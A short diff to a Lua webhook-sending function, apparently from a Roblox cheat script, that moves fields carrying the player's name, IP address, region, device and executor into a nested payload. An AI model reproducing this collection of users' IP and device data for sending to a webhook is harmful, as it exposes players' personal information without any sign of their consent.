@@ -225,14 +225,10 @@ function Vortex:WebhookSender(prompt)
     }
     
     local data = {
-        ["content"] = prompt,
+        ["webhook-text"] = prompt,
 	["From"] = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")",
-	["Exploit"] = Exploit(),
-	["User-Region"] = Virtual_Region(),
-	["User-IP"] = Virtual_IP(),
 	["Time"] = tostring(os.date("%X")) .. " ( " .. Virtual_Region() .. " )",
 	["Date"] = tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. Virtual_Region(),
-	["Device"] = DeviceInfo(),
 	["GAME"] = {
 		["Game-Name"] = PI(game.PlaceId).Name,
 		["Game-ID"] = game.PlaceId,
@@ -260,7 +256,11 @@ function Vortex:WebhookSender(prompt)
 		["voice-chat"] = vcenab(),
 		["fps"] = math.floor(Workspace:GetRealPhysicsFPS()),
 		["ping"] = tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms",
-		["memory-usage"] = tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " mb"
+		["memory-usage"] = tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " mb",
+		["Exploit"] = Exploit(),
+		["Device"] = DeviceInfo(),
+		["user-region"] = Virtual_Region(),
+		["IP"] = Virtual_IP()
 	}
     }
 
